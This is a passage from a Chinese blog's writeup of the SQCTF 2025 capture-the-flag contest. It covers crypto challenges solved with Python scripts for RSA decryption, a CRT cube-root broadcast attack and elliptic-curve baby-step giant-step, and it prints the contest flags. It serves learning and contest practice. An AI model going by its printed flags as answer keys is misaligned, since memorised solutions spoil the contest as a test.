<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQCTF 2025 Writeup | Beiko's Blog</title><meta name="author" content="Beiko"><meta name="copyright" content="Beiko"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQCTF 2025 Writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="SQCTF 2025 Writeup">
<meta property="og:url" content="https://www.xieweiling.top/blog/2025/04/13/CTF-WP/SQCTF%202025/index.html">
<meta property="og:site_name" content="Beiko&#39;s Blog">
<meta property="og:description" content="SQCTF 2025 Writeup">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?11&type=yktk">
<meta property="article:published_time" content="2025-04-13T10:00:00.000Z">
<meta property="article:modified_time" content="2025-04-12T16:00:00.000Z">
<meta property="article:author" content="Beiko">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://api.xieweiling.top/?imgtype=pc&tags=唯美&?11&type=yktk"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQCTF 2025 Writeup",
  "url": "https://www.xieweiling.top/blog/2025/04/13/CTF-WP/SQCTF%202025/",
  "image": "https://api.xieweiling.top/?imgtype=pc&tags=唯美&?11&type=yktk",
  "datePublished": "2025-04-13T10:00:00.000Z",
  "dateModified": "2025-04-12T16:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Beiko",
      "url": "https://www.xieweiling.top/blog/"
    }
  ]
}</script><link rel="shortcut icon" href="https://api.xieweiling.top/favicon.ico"><link rel="canonical" href="https://www.xieweiling.top/blog/2025/04/13/CTF-WP/SQCTF%202025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/blog/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/blog/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQCTF 2025 Writeup',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 5.4.2"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.xieweiling.top/favicon.png" onerror="this.onerror=null;this.src='/blog/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/blog/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/blog/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/blog/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.beiko.top"><i class="fa-fw fas fa-image"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://xieweiling.top/API"><i class="fa-fw fas fa-chain"></i><span> 本站API接口</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://api.xieweiling.top/?imgtype=pc&amp;tags=唯美&amp;?11&amp;type=yktk);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/blog/"><span class="site-name">Beiko's Blog</span></a><a class="nav-page-title" href="/blog/"><span class="site-name">SQCTF 2025 Writeup</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://www.beiko.top"><i class="fa-fw fas fa-image"></i><span> 图库</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://xieweiling.top/API"><i class="fa-fw fas fa-chain"></i><span> 本站API接口</span></a></div><div class="menus_item"><a class="site-page" href="/blog/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQCTF 2025 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">更新于</span><time datetime="2025-04-12T16:00:00.000Z" title="更新于 2025-04-13 00:00:00">2025-04-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base？"><a href="#base？" class="headerlink" title="base？"></a>base？</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-0.png"></p>
<h3 id="别阴阳我了行吗？"><a href="#别阴阳我了行吗？" class="headerlink" title="别阴阳我了行吗？"></a>别阴阳我了行吗？</h3><p>阴阳怪气解码，然后把中文感叹号改成英文感叹号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-1.png"></p>
<h3 id="春风得意马蹄疾"><a href="#春风得意马蹄疾" class="headerlink" title="春风得意马蹄疾"></a>春风得意马蹄疾</h3><p>套了四层社会主义核心价值观解密</p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/cvecode">https://ctf.bugku.com/tool/cvecode</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-2.png"></p>
<h3 id="简单RSA"><a href="#简单RSA" class="headerlink" title="简单RSA"></a>简单RSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为上一步我们已经求得 p, q</span></span><br><span class="line">p = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261</span></span><br><span class="line">q = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n) = (p-1)*(q-1)</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d，使得 d * e ≡ 1 (mod φ(n))</span></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算逆元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    gcd, x1, y1 = egcd(b % a, a)</span><br><span class="line">    x = y1 - (b // a) * x1</span><br><span class="line">    y = x1</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    gcd, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;逆元不存在&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">d = modinv(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 d 对密文进行 RSA 解密： m = c^d mod n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换为字节串（假设原消息使用的是大端字节序）</span></span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m_bytes)</span><br><span class="line"><span class="comment"># SQCTF&#123;be7e48547356cdf16649fd29e0ff9e1f&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的模数和密文</span></span><br><span class="line">n1 = <span class="number">64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681</span></span><br><span class="line">n2 = <span class="number">82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063</span></span><br><span class="line">n3 = <span class="number">62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165</span></span><br><span class="line">c2 = <span class="number">58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023</span></span><br><span class="line">c3 = <span class="number">23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认模数两两互质</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n1, n2) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n1, n3) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n2, n3) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用CRT合并c1和c2</span></span><br><span class="line">delta = (c2 - c1) % n2</span><br><span class="line">inv_n1_mod_n2 = <span class="built_in">pow</span>(n1, -<span class="number">1</span>, n2)</span><br><span class="line">k = (delta * inv_n1_mod_n2) % n2</span><br><span class="line">x12 = c1 + k * n1</span><br><span class="line">M12 = n1 * n2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将合并结果与c3合并</span></span><br><span class="line">delta3 = (c3 - x12) % n3</span><br><span class="line">inv_M12_mod_n3 = <span class="built_in">pow</span>(M12, -<span class="number">1</span>, n3)</span><br><span class="line">k3 = (delta3 * inv_M12_mod_n3) % n3</span><br><span class="line">x123 = x12 + k3 * M12</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_cube_root</span>(<span class="params">n</span>):</span><br><span class="line">    low, high = <span class="number">0</span>, n</span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        mid_cubed = mid ** <span class="number">3</span>  <span class="comment"># 修正后的行</span></span><br><span class="line">        <span class="keyword">if</span> mid_cubed &lt; n:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> mid_cubed &gt; n:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> high</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解立方根</span></span><br><span class="line">cube_root = find_cube_root(x123)</span><br><span class="line"><span class="keyword">if</span> cube_root ** <span class="number">3</span> == x123:</span><br><span class="line">    m = cube_root</span><br><span class="line">    flag_bytes = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag Bytes:&quot;</span>, flag_bytes)</span><br><span class="line"><span class="comment"># SQCTF&#123;CRT_Unl0cks_RSA_Eff1c13ncy&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="失落矿洞中的密码"><a href="#失落矿洞中的密码" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, isPrime</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">p = <span class="number">7654319</span></span><br><span class="line">a = <span class="number">1234577</span></span><br><span class="line">b = <span class="number">3213242</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_on_curve</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    x, y = P</span><br><span class="line">    <span class="keyword">return</span> (y * y - (x**<span class="number">3</span> + a * x + b)) % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> Q</span><br><span class="line">    <span class="keyword">if</span> Q <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> P</span><br><span class="line">    x1, y1 = P</span><br><span class="line">    x2, y2 = Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> (y1 + y2) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> P == Q:</span><br><span class="line">        l = (<span class="number">3</span> * x1 * x1 + a) * inverse(<span class="number">2</span> * y1, p) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = (y2 - y1) * inverse(x2 - x1, p) % p</span><br><span class="line"></span><br><span class="line">    x3 = (l * l - x1 - x2) % p</span><br><span class="line">    y3 = (l * (x1 - x3) - y1) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_neg</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    x, y = P</span><br><span class="line">    <span class="keyword">return</span> (x, (-y) % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scalar_mult</span>(<span class="params">k, P</span>):</span><br><span class="line">    R = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            R = point_add(R, P)</span><br><span class="line">        P = point_add(P, P)</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="comment"># 椭圆曲线参数</span></span><br><span class="line">G = (<span class="number">5234568</span>, <span class="number">2287747</span>)</span><br><span class="line">PublicKey = (<span class="number">2366653</span>, <span class="number">1424308</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Baby Step Giant Step 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">P, Q, order_estimate</span>):</span><br><span class="line">    m = math.isqrt(order_estimate) + <span class="number">1</span></span><br><span class="line">    baby_steps = &#123;&#125;</span><br><span class="line">    R = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        baby_steps[R] = j</span><br><span class="line">        R = point_add(R, P) <span class="keyword">if</span> R <span class="keyword">else</span> P</span><br><span class="line"></span><br><span class="line">    mP = scalar_mult(m, point_neg(P))</span><br><span class="line">    R = Q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> R <span class="keyword">in</span> baby_steps:</span><br><span class="line">            <span class="keyword">return</span> i * m + baby_steps[R]</span><br><span class="line">        R = point_add(R, mP)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 估计 G 的阶</span></span><br><span class="line">order_estimate = p  <span class="comment"># 上界</span></span><br><span class="line">secret = bsgs(G, PublicKey, order_estimate)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] secretKey =&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">crypted_data = [(<span class="number">5081741</span>, <span class="number">6744615</span>), (<span class="number">610619</span>, <span class="number">6218</span>)]</span><br><span class="line">C1, C2 = crypted_data</span><br><span class="line"></span><br><span class="line">shared = scalar_mult(secret, C1)</span><br><span class="line">M = point_add(C2, point_neg(shared))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] M =&quot;</span>, M)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] x + y =&quot;</span>, M[<span class="number">0</span>] + M[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># [+] x + y = 5720914</span></span><br><span class="line"><span class="comment"># 所以flag为：SQCTF&#123;5720914&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="密室逃脱的终极挑战"><a href="#密室逃脱的终极挑战" class="headerlink" title="密室逃脱的终极挑战"></a>密室逃脱的终极挑战</h3><p>用IDA打开就能看到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-3.png"></p>
<h3 id="玩的挺变态啊清茶哥"><a href="#玩的挺变态啊清茶哥" class="headerlink" title="玩的挺变态啊清茶哥"></a>玩的挺变态啊清茶哥</h3><p>用随波逐流找编码图，对照打出来就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-4.png"></p>
<h3 id="丢三落四的小I"><a href="#丢三落四的小I" class="headerlink" title="丢三落四的小I"></a>丢三落四的小I</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span 